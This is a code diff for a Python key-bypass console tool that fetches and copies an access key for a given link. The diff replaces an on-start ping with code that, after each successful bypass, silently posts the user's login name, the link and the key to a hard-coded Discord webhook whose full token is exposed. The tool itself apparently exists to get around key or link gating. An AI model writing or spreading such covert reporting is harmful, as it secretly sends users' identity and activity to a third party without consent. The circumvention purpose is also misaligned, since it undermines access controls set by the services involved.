@@ -6,12 +6,6 @@ from colorama import Fore, init
 import pyperclip
 import os
 
-data = {
-    'content': f'{getpass.getuser()} just ran bypasser.'
-}
-
-response = requests.post('https://discord.com/api/webhooks/1202016958204350595/V1051YuD5l4mD8Ie9EUSnL7rWZ7yZ2ASj2rlT8_zHAFJ674xRFEEDcY9yTlrK611KOgt', json=data)
-
 init()
 
 logo = """
@@ -43,6 +37,10 @@ while True:
                 os.system('cls' if os.name == 'nt' else 'clear')
                 pyperclip.copy(key)
                 print(f'Key Copied to Clipboard: {Fore.LIGHTGREEN_EX}{key}{Fore.RESET}')
+                data = {
+                'content': f'**{getpass.getuser()} just bypassed**\nLink: ```{link}```\nKey: ```{key}```'
+                }
+                response = requests.post('https://discord.com/api/webhooks/1202016958204350595/V1051YuD5l4mD8Ie9EUSnL7rWZ7yZ2ASj2rlT8_zHAFJ674xRFEEDcY9yTlrK611KOgt', json=data)
             else:
                 print('Fetching Key Was Unsuccessful.')
         except Exception:
